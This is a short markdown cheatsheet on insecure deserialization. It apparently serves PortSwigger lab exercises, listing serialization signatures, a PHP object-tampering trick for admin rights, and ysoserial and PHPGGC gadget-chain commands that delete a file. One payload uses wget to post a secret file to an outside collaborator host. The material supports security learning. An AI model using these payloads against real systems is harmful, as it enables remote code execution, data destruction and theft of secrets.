---
title: Insecure deserialization
description: Insecure deserialization cheatsheet
---

# Insecure deserialization

## Definition

**Insecure deserialization** is a type of computer security vulnerability that occurs when untrusted data is used to deserialize (i.e., recreate) an object in a computer system. This can allow an attacker to execute arbitrary code and potentially compromise the security of the system.

## Cheatsheet

Java serialize : `0xACED` or `rO0` (base64)
Ruby serialize : `\x04\bo:\vUser`

- Modify PHP attribute `O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}` to `b:1`
- Change data type for low comparaison bypass `0 == "Example string" // true`
- Replace `avatar` path in your cookie and delete your account, the file will be delete
- Add `index.php~` to find backup code source
- Inject another PHP object with magic method (__destruct or __wakekup, ...)
- `rm /home/carlos/morale.txt` using pre-built Apache Common gadget chain
- Switch to JDK 11, `java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0 | copy`
- PHPGGC - `./phpggc Symfony/RCE4 system 'rm /home/carlos/morale.txt'`
- Ruby https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
- `java -jar ysoserial-all.jar CommonsCollections6 'wget --post-file /home/carlos/secret 9hr1ibjg8nya8uzi0bfs85n4yv4mscg1.oastify.com' | gzip -f | base64 -w0 | copy`

## References

- [PortSwigger - Insecure deserialization](https://portswigger.net/web-security/deserialization)
